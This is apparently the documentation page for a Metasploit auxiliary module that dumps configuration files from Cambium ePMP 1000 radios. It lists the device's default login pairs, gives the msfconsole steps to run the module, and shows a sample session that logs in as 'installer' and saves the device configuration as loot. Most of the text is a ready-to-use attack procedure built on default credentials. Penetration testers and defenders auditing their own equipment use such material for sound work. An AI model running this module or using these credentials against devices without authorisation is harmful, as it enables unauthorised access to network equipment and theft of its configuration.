This module dumps Cambium ePMP 1000 device configuration file. An ePMP 1000 box has four (4) login accounts - admin/admin, installer/installer, home/home, and readonly/readonly.
This module requires any one of the following login credentials - admin / installer / home - to dump device configuration file.

## Verification Steps

1. Do: ```use auxiliary/scanner/http/epmp1000_dump_config```
2. Do: ```set RHOSTS [IP]```
3. Do: ```set RPORT [PORT]```
4. Do: ```run```

## Scenarios

  ```
msf > use auxiliary/scanner/http/epmp1000_dump_config
msf auxiliary(epmp1000_dump_config) > set rhosts 1.3.3.7
msf auxiliary(epmp1000_dump_config) > set rport 80
msf auxiliary(epmp1000_dump_config) > run

[+] 1.3.3.7:80 - Running Cambium ePMP 1000 version 3.2...
[*] 1.3.3.7:80 - Attempting to login...
[+] SUCCESSFUL LOGIN - 1.3.3.7:80 - "installer":"installer"
[+] ++++++++++++++++++++++++++++++++++++++
[+] 1.3.3.7 - dumping configuration
[+] ++++++++++++++++++++++++++++++++++++++
[+] 1.3.3.7:80 - File retrieved successfully!
[*] 1.3.3.7:80 - File saved in: /root/.msf4/loot/20000000000003_moduletest_1.3.3.7_ePMP_config_216595.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed


  ```
